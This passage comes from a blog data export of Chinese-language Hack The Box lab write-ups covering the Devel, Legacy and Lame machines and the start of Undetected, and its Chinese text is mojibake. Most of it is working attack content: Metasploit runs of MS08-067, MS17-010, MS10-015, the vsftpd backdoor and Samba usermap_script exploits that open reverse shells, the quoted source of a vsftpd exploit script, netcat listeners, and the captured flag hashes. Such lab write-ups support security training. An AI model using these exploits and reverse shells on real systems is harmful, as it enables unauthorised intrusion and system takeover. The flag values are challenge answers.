process, none) LHOST 10.10.16.2 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 2K SP4 - Windows 7 (x86) è®¾ç½®å¥½ä»¥åï¼Œæ‰§è¡Œ msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; exploit [*] Started reverse TCP handler on 10.10.16.2:4444 [*] Launching notepad to host the exploit... [+] Process 3972 launched. [*] Reflectively injecting the exploit DLL into 3972... [*] Injecting exploit into 3972 ... [*] Exploit injected. Injecting payload into 3972... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (175174 bytes) to 10.10.10.5 [*] Meterpreter session 2 opened (10.10.16.2:4444 -&gt; 10.10.10.5:49163) at 2022-03-03 02:44:09 -0500 meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter &gt; sysinfo Computer : DEVEL OS : Windows 7 (6.1 Build 7600). Architecture : x86 System Language : el_GR Domain : HTB Logged On Users : 2 Meterpreter : x86/windows æˆåŠŸæ‹¿åˆ°systemæƒé™ meterpreter &gt; search -f user.txt Found 1 result... c:\\Users\\babis\\Desktop\\user.txt (34 bytes) meterpreter &gt; cat &#39;c:\\Users\\babis\\Desktop\\user.txt&#39; 489b24475e33a86c802d19db5fbd40e1 meterpreter &gt; search -f root.txt Found 1 result... c:\\Users\\Administrator\\Desktop\\root.txt (34 bytes) meterpreter &gt; cat &#39;c:\\Users\\Administrator\\Desktop\\root.txt&#39; af3b66607827cd5c2153fdbfff2a558a æˆåŠŸæ‹¿åˆ°userå’Œrootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Legacy - Hackthebox","slug":"Hackthebox - Legacy","date":"2022-03-02T11:38:36.000Z","updated":"2023-05-20T01:57:31.000Z","comments":true,"path":"2022/03/02/Hackthebox - Legacy/","link":"","permalink":"http://www.lucifiel.com/2022/03/02/Hackthebox%20-%20Legacy/","excerpt":"","text":"Hackthebox - Legacyé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†NmapStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-02 00:06 EST Nmap scan report for 10.10.10.4 Host is up (0.54s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds 3389/tcp closed ms-wbt-server Device type: general purpose|specialized Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (89%) OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2 Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows XP SP2 or SP3 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows XP Professional SP3 (90%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: 5d00h57m39s, deviation: 1h24m49s, median: 4d23h57m40s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:e2:3e (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2022-03-07T09:04:30+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) TRACEROUTE (using port 3389/tcp) HOP RTT ADDRESS 1 541.52 ms 10.10.16.1 2 541.58 ms 10.10.10.4 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 101.31 seconds Sambaâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Legacy] â””â”€# nmap -p445 --min-rate 5000 --script=vuln 10.10.10.4 130 â¨¯ Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-02 00:10 EST Nmap scan report for 10.10.10.4 Host is up (0.24s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: |_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: EOF | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://technet.microsoft.com/en-us/library/security/ms08-067.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx Nmap done: 1 IP address (1 host up) scanned in 28.55 seconds ä½¿ç”¨vulnæ’ä»¶æ‰«æ445ç«¯å£çš„smbåå‘ç°å­˜åœ¨ä¸¤ä¸ªæ¼æ´ï¼ŒMS08-067å’ŒMS17-010ï¼Œåˆ†åˆ«å»åˆ©ç”¨ä¸€ä¸‹è¯•è¯• æ¼æ´åˆ©ç”¨MS08-067msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options Module options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.10.10.4 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 445 yes The SMB service port (TCP) SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC) Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.2 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Targeting ä½¿ç”¨æŒ‡å®šçš„expå¹¶è®¾ç½®å¥½é…ç½®ä¿¡æ¯åï¼Œè¾“å…¥exploitæ‰§è¡Œ msf6 exploit(windows/smb/ms08_067_netapi) &gt; exploit [*] Started reverse TCP handler on 10.10.16.2:4444 [*] 10.10.10.4:445 - Automatically detecting the target... [*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English [*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX) [*] 10.10.10.4:445 - Attempting to trigger the vulnerability... [*] Sending stage (175174 bytes) to 10.10.10.4 [*] Meterpreter session 2 opened (10.10.16.2:4444 -&gt; 10.10.10.4:1032) at 2022-03-02 00:21:27 -0500 meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter &gt; sysinfo Computer : LEGACY OS : Windows XP (5.1 Build 2600, Service Pack 3). Architecture : x86 System Language : en_US Domain : HTB Logged On Users : 1 Meterpreter : x86/windows æˆåŠŸè·å¾—systemæƒé™ MS17-010è®¾ç½®å¥½é…ç½®åè¾“å…¥exploitæ‰§è¡Œ msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options Module options (exploit/windows/smb/ms17_010_psexec): Name Current Setting Required Description ---- --------------- -------- ----------- DBGTRACE false yes Show extra debug trace info LEAKATTEMPTS 99 yes How many times to try to leak transaction NAMEDPIPE no A named pipe that can be connected to (leave blank for auto) NAMED_PIPES /usr/share/metasploit-framework/data/wordlists/named_pipes.txt yes List of named pipes to check RHOSTS 10.10.10.4 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 445 yes The Target port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.2 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic æ‰§è¡ŒæˆåŠŸ msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit [*] Started reverse TCP handler on 10.10.16.2:4444 [*] 10.10.10.4:445 - Target OS: Windows 5.1 [*] 10.10.10.4:445 - Filling barrel with fish... done [*] 10.10.10.4:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt; [*] 10.10.10.4:445 - [*] Preparing dynamite... [*] 10.10.10.4:445 - [*] Trying stick 1 (x86)...Boom! [*] 10.10.10.4:445 - [+] Successfully Leaked Transaction! [*] 10.10.10.4:445 - [+] Successfully caught Fish-in-a-barrel [*] 10.10.10.4:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt; [*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81abb3c8 [*] 10.10.10.4:445 - Built a write-what-where primitive... [+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained! [*] 10.10.10.4:445 - Selecting native target [*] 10.10.10.4:445 - Uploading payload... uercgOUf.exe [*] 10.10.10.4:445 - Created \\uercgOUf.exe... [+] 10.10.10.4:445 - Service started successfully... [*] Sending stage (175174 bytes) to 10.10.10.4 [*] 10.10.10.4:445 - Deleting \\uercgOUf.exe... [*] Meterpreter session 1 opened (10.10.16.2:4444 -&gt; 10.10.10.4:1033) at 2022-03-02 00:31:20 -0500 æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿä¿¡æ¯å’Œæƒé™ meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter &gt; sysinfo Computer : LEGACY OS : Windows XP (5.1 Build 2600, Service Pack 3). Architecture : x86 System Language : en_US Domain : HTB Logged On Users : 1 Meterpreter : x86/windows Flagmeterpreter &gt; search -f user.txt Found 1 result... c:\\Documents and Settings\\john\\Desktop\\user.txt (32 bytes) meterpreter &gt; cat &#39;c:\\Documents and Settings\\john\\Desktop\\user.txt&#39; e69af0e4f443de7e36876fda4ec7644f meterpreter &gt; search -f root.txt Found 1 result... c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes) meterpreter &gt; cat &quot;c:\\Documents and Settings\\Administrator\\Desktop\\root.txt&quot; 993442d258b0e0ec917cae9e695d5713 meterpreter &gt; æŸ¥æ‰¾å¹¶æˆåŠŸæ‹¿åˆ°flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Lame - Hackthebox","slug":"Hackthebox - Lame","date":"2022-03-01T11:38:36.000Z","updated":"2023-05-20T01:56:19.000Z","comments":true,"path":"2022/03/01/Hackthebox - Lame/","link":"","permalink":"http://www.lucifiel.com/2022/03/01/Hackthebox%20-%20Lame/","excerpt":"","text":"Hackthebox - Lameé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.3 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-01 00:25 EST Nmap scan report for 10.10.10.3 Host is up (0.51s latency). Not shown: 65530 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.16.2 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), Arris TG862G/CT cable modem (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%), Raritan Dominion PX DPXR20-20L power control unit (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 2h30m20s, deviation: 3h32m12s, median: 17s | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2022-03-01T00:26:29-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) TRACEROUTE (using port 21/tcp) HOP RTT ADDRESS 1 503.51 ms 10.10.16.1 2 503.58 ms 10.10.10.3 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 101.36 seconds æ¼æ´åˆ©ç”¨Ftpè¿™è¾¹FTPçš„ç‰ˆæœ¬æ˜¯vsftpd 2.3.4ï¼Œæˆ‘å¯»æ€å¯èƒ½æœ‰æ¼æ´ï¼Œå»æœç´¢ä¸€ä¸‹çœ‹çœ‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# searchsploit vsftpd 2.3.4 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results è¿™é‡Œæœ‰ä¸¤ä¸ªåé—¨æ¼æ´æ‰§è¡Œï¼Œå…¶ä¸­ä¸€ä¸ªè¿˜æ˜¯msfçš„ï¼Œå»åˆ©ç”¨çœ‹çœ‹ Metasploitmsf6 &gt; search vsftpd 2.3.4 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 excellent No VSFTPD v2.3.4 Backdoor Command Execution å’±ä»¬ä½¿ç”¨å®ƒæ¥åˆ©ç”¨æ¼æ´ msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options Module options (exploit/unix/ftp/vsftpd_234_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 21 yes The target port (TCP) Payload options (cmd/unix/interact): Name Current Setting Required Description ---- --------------- -------- ----------- Exploit target: Id Name -- ---- 0 Automatic msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 10.10.10.3 rhosts =&gt; 10.10.10.3 msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit [*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4) [*] 10.10.10.3:21 - USER: 331 Please specify the password. whoami [*] Exploit completed, but no session was created. msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; whoami [*] exec: whoami root è¿™è¾¹ç¡®å®æ‰§è¡ŒæˆåŠŸäº†æˆ‘ä»¬çš„å‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰è·å¾—ä¸€ä¸ªå¯ç”¨çš„shellï¼Œè¿™å¹¶ä¸ç¬¦åˆæˆ‘ä»¬çš„ç›®çš„ï¼Œè€Œä¸”æˆ‘çš„åŸåˆ™ä¸€å‘æ˜¯èƒ½ä¸ä½¿ç”¨msfå°±ä¸ä½¿ç”¨ æˆ‘ä»¬æ¥çœ‹çœ‹å¦ä¸€ä¸ªæ¼æ´ Exploitâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# searchsploit vsftpd 2.3.4 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# locate unix/remote/49757.py /usr/share/exploitdb/exploits/unix/remote/49757.py â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cp /usr/share/exploitdb/exploits/unix/remote/49757.py ~/Desktop/Exploit.py ç»™å¤åˆ¶åˆ°æ¡Œé¢ï¼Œç„¶åæˆ‘ä»¬å»æŸ¥çœ‹ä¸€ä¸‹ # Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution # Date: 9-04-2021 # Exploit Author: HerculesRD # Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html # Version: vsftpd 2.3.4 # Tested on: debian # CVE : CVE-2011-2523 #!/usr/bin/python3 from telnetlib import Telnet import argparse from signal import signal, SIGINT from sys import exit def handler(signal_received, frame): # Handle any cleanup here print(&#39; [+]Exiting...&#39;) exit(0) signal(SIGINT, handler) parser=argparse.ArgumentParser() parser.add_argument(&quot;host&quot;, help=&quot;input the address of the vulnerable host&quot;, type=str) args = parser.parse_args() host = args.host portFTP = 21 #if necessary edit this line user=&quot;USER nergal:)&quot; password=&quot;PASS pass&quot; tn=Telnet(host, portFTP) tn.read_until(b&quot;(vsFTPd 2.3.4)&quot;) #if necessary, edit this line tn.write(user.encode(&#39;ascii&#39;) + b&quot;\\n&quot;) tn.read_until(b&quot;password.&quot;) #if necessary, edit this line tn.write(password.encode(&#39;ascii&#39;) + b&quot;\\n&quot;) tn2=Telnet(host, 6200) print(&#39;Success, shell opened&#39;) print(&#39;Send `exit` to quit shell&#39;) tn2.interact() è¿™è¾¹æˆ‘å°è¯•åˆ©ç”¨åï¼Œå‘ç°åˆ©ç”¨å¤±è´¥äº† æ¢ä¸ªå…¶ä»–æ€è·¯çœ‹çœ‹ Sambaâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Lame] â””â”€# searchsploit Samba 3.0.20 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass | multiple/remote/10095.txt Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit) | unix/remote/16320.rb Samba &lt; 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Samba &lt; 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Samba &lt; 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results è¿™è¾¹ä¹Ÿæ˜¯æœ‰ä¸€ä¸ªmsfçš„è„šæœ¬ï¼Œå…ˆç”¨ç”¨çœ‹å§ ä½¿ç”¨msfconsoleå¯åŠ¨msf msf6 &gt; search Samba 3.0.20 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/samba/usermap_script 2007-05-14 excellent No Samba &quot;username map script&quot; Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script msf6 &gt; use 0 [*] No payload configured, defaulting to cmd/unix/reverse_netcat msf6 exploit(multi/samba/usermap_script) &gt; use exploit/multi/samba/usermap_script [*] Using configured payload cmd/unix/reverse_netcat ç„¶åæŸ¥çœ‹ä¸€ä¸‹éœ€è¦ä¿®æ”¹å“ªäº›é…ç½® msf6 exploit(multi/samba/usermap_script) &gt; options Module options (exploit/multi/samba/usermap_script): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 139 yes The target port (TCP) Payload options (cmd/unix/reverse_netcat): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.200.128 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic ç„¶åå’±ä»¬å¼€å§‹ä¿®æ”¹ msf6 exploit(multi/samba/usermap_script) &gt; set rhosts 10.10.10.3 rhosts =&gt; 10.10.10.3 msf6 exploit(multi/samba/usermap_script) &gt; set rport 445 rport =&gt; 445 msf6 exploit(multi/samba/usermap_script) &gt; set lhost 10.10.16.2 lhost =&gt; 10.10.16.2 ç„¶åå¼€å§‹åˆ©ç”¨ msf6 exploit(multi/samba/usermap_script) &gt; exploit [*] Started reverse TCP handler on 10.10.16.2:4444 [*] Command shell session 1 opened (10.10.16.2:4444 -&gt; 10.10.10.3:45192) at 2022-03-01 01:05:18 -0500 whoami root æˆåŠŸæ‹¿åˆ°rootæƒé™ ç„¶åè¾“å…¥shellè¿›å…¥shellæ§åˆ¶æ¨¡å¼ root@lame:/# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) root@lame:/home/makis# cat user.txt cat user.txt 7547181b7a57b001cf0ba3f497b5e8b0 åœ¨&#x2F;home&#x2F;makis&#x2F;user.txtä¸­æ‰¾åˆ°äº†useræƒé™çš„flagæ–‡ä»¶ root@lame:/home/makis# cd /root cd /root root@lame:/root# ls ls Desktop reset_logs.sh root.txt vnc.log root@lame:/root# cat root.txt cat root.txt a07cd9e7c60b75852e396c4320f5fae4 åœ¨&#x2F;root&#x2F;root.txtä¸­æ‰¾åˆ°äº†rootæƒé™çš„flag å…¶ä»–æ€è·¯åŸºäºå¯ä»¥ä¸ç”¨è‡ªåŠ¨åŒ–å·¥å…·å°±ä¸ç”¨çš„åŸåˆ™ï¼Œå’±ä»¬è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªpythonçš„åˆ©ç”¨å·¥å…· https://github.com/ozuma/CVE-2007-2447 é¦–å…ˆä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£ ç„¶åè¿›è¡Œåˆ©ç”¨ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Lame] â””â”€# python3 Exploit.py 10.10.10.3 445 10.10.16.2 4444 æ ¼å¼åˆ†åˆ«æ˜¯python3 åˆ©ç”¨å·¥å…· é¶æœºIP é¶æœºç«¯å£ æœ¬åœ°IP æœ¬åœ°ç«¯å£ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.2] from (UNKNOWN) [10.10.10.3] 43672 python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; root@lame:/# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) è¿™æ ·åœ¨ä¸ä½¿ç”¨msfçš„æƒ…å†µä¸‹ï¼Œä¹ŸæˆåŠŸæ‹¿åˆ°äº†rootæƒé™","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Undetected - Hackthebox","slug":"Hackthebox - Undetected","date":"2022-02-25T11:38:36.000Z","updated":"2023-05-20T03:18:52.000Z","comments":true,"path":"2022/02/25/Hackthebox - Undetected/","link":"","permalink":"http://www.lucifiel.com/2022/02/25/Hackthebox%20-%20Undetected/","excerpt":"","text":"Hackthebox - Undetectedé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.146 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-24 21:25 EST Nmap scan report for 10.10.11.146 Host is up (0.23s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2 (protocol 2.0) | ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA) | 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA) |_ 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Diana&#39;s Jewelry No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=2/24%OT=22%CT=1%CU=42918%PV=Y%DS=2%DC=T%G=Y%TM=62183E4 OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=C)SEQ OS:(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505 OS:ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6= OS:M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF= OS:Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q OS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y% OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD OS:=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL OS:=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops TRACEROUTE (using port 554/tcp) HOP RTT ADDRESS 1 222.46 ms 10.10.14.1 2 222.61 ms 10.10.11.146 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 53.48 seconds nmapæ‰«æååªçœ‹åˆ°22å’Œ80ï¼Œé‚£å°±å»çœ‹çœ‹80ç«¯å£å§ Http è¿™çœ‹ç€åƒæ˜¯ä¸€å®¶ç å®åº—çš„å®˜ç½‘ï¼Œå…ˆåœ¨ç½‘ç«™ä¸Šåˆ°å¤„çœ‹çœ‹æœ‰æ²¡æœ‰å•¥å¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿å§ ç‚¹å‡»STOREä¼šè·³è½¬åˆ°store.djewelry.htbï¼ŒåŠ å…¥hostså†çœ‹çœ‹ echo 10.10.11.146 djewelry.htb store.djewelry.htb &gt;&gt; /etc/hosts è¿›æ¥ä»¥åæ˜¯ä¸€ä¸ªå•†åŸé¡µé¢ï¼Œåˆ°å¤„çœ‹çœ‹åŠŸèƒ½ç‚¹ è¿™é‡Œæç¤ºç½‘ç«™å·²æ¬è¿ï¼Œå»åšä¸ªFUZZçœ‹çœ‹ Fuzzâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://store.djewelry.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ 